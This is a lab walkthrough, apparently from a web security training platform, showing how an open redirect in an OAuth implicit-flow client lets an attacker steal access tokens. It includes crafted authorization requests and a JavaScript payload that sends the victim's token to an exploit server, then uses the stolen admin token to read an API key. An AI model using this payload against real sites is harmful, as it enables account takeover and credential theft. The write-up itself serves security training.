# Lab: Stealing OAuth access tokens via an open redirect

**Difficulty:** Practitioner

## Objective

Exploit an **Open Redirect** vulnerability in the client application to steal the Admin's **OAuth Access Token**, then use it to retrieve the Admin's API Key.

-------------------------------------------
# Solution

## 1. Log in using OAuth

Log in normally using the provided OAuth account.

---

## 2. Capture the OAuth Authorization Request

While intercepting the login request, locate the following request:

```http
GET /auth?client_id=sg1xf2hmdij5yoqy5agnx&redirect_uri=https://0ad50068031b59c7824016b7003f009c.web-security-academy.net/oauth-callback&response_type=token&nonce=-1328145270&scope=openid%20profile%20email HTTP/2

Host: oauth-0af5002603dc5903824014f302220061.oauth-server.net
```

Notice that this OAuth flow uses:

```text
response_type=token
```

instead of:

```text
response_type=code
```

which means the OAuth Provider will return an **Access Token** directly.

---

## 3. Identify the Open Redirect

Browse the application and locate the following endpoint:

```http
GET /post/next?path=/post?postId=4 HTTP/1.1
```

To verify that it is vulnerable, change the value of `path` to an external domain:

```text
/post/next?path=https://example.com
```

The application redirects successfully, confirming the presence of an **Open Redirect** vulnerability.

---

## 4. Confirm the Vulnerability

Modify the intercepted OAuth request:

```http
GET /auth?client_id=sg1xf2hmdij5yoqy5agnx&redirect_uri=https://0ad50068031b59c7824016b7003f009c.web-security-academy.net/oauth-callback/../post?postId=3&response_type=token&nonce=-1328145270&scope=openid%20profile%20email HTTP/2
```

After completing the OAuth flow, notice that the URL contains:

```text
access_token=Q3drRiDj7hHjTjPSFtYKJR89oXgitGSbPHzNTaTPv6p
```

This confirms that the application returns the Access Token in the URL fragment.

---

## 5. Create the Exploit

Initially, use the following payload:

```html
<script>
window.location='/?'+document.location.hash.substr(1)
</script>
```

However, this only works after the OAuth flow has already completed.

To automate the entire attack, replace it with:

```html
<script>
    if (!document.location.hash) {
        window.location = 'https://oauth-0af5002603dc5903824014f302220061.oauth-server.net/auth?client_id=sg1xf2hmdij5yoqy5agnx&redirect_uri=https://0ad50068031b59c7824016b7003f009c.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a9000a1035559ee8295158e01850044.exploit-server.net/exploit&response_type=token&nonce=-830857010&scope=openid%20profile%20email';
    } else {
        window.location='/?'+document.location.hash.substr(1);
    }
</script>
```

This script works in two stages:

1. Redirects the victim to the OAuth Authorization Endpoint.
2. Once the Access Token appears inside the URL fragment (`#access_token=...`), it redirects again to:

```
/?access_token=...
```

allowing the Exploit Server to capture the token in its Access Log.

---

## 6. Test the Exploit

Click:

- Store
- View Exploit

Then check the Access Log.

Example:

```text
GET /?access_token=2weGH4qqbpIuZUhhp0GNc3dAo9gambxBZ9P6ZuzClPQ&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

This Access Token belongs to your own account.

---

## 7. Retrieve User Information

Use the Access Token to request:

```http
GET /me HTTP/2
Authorization: Bearer 2weGH4qqbpIuZUhhp0GNc3dAo9gambxBZ9P6ZuzClPQ
```

Response:

```json
{
    "sub":"wiener",
    "apikey":"rNcFgxgJ8PBaGBj21bMWlD9v2fRDXViY",
    "name":"Peter Wiener",
    "email":"wiener@hotdog.com",
    "email_verified":true
}
```

This confirms that the stolen Access Token can be used to call the OAuth API.

---

## 8. Attack the Victim

Click:

- Deliver exploit to victim

Return to the Exploit Server Access Log.

A new request appears:

```text
GET /?access_token=fqunJgvH2AF3q7nRh2m1tRFM6x5rv1F_dkMl3Ixc9Uo&expires_in=3600&token_type=Bearer&scope=openid%20profile%20email
```

Copy the Admin's Access Token.

---

## 9. Retrieve the Admin's API Key

Send:

```http
GET /me HTTP/2
Authorization: Bearer fqunJgvH2AF3q7nRh2m1tRFM6x5rv1F_dkMl3Ixc9Uo
```

Response:

```json
{
    "sub":"administrator",
    "apikey":"YDHVZgFXMdiPxHz8shvGOrGzCkwG5LjT",
    "name":"Administrator",
    "email":"administrator@normal-user.net",
    "email_verified":true
}
```

Copy the API Key:

```text
YDHVZgFXMdiPxHz8shvGOrGzCkwG5LjT
```

Submit it to solve the lab.

---

# Why did the attack work?

The OAuth Provider correctly restricted the `redirect_uri` to the client application.

However, the client application itself contained an **Open Redirect** vulnerability.

The attacker abused this by making the OAuth Provider redirect the victim to a legitimate page inside the application, which immediately redirected again to the attacker's Exploit Server.

Since the OAuth flow used:

```text
response_type=token
```

the Access Token was returned inside the URL fragment (`#access_token=...`).

A small JavaScript payload converted the fragment into a query string, allowing the Exploit Server to capture the victim's Access Token.

Finally, the stolen Access Token was used to call the `/me` API endpoint and retrieve the Admin's API Key.
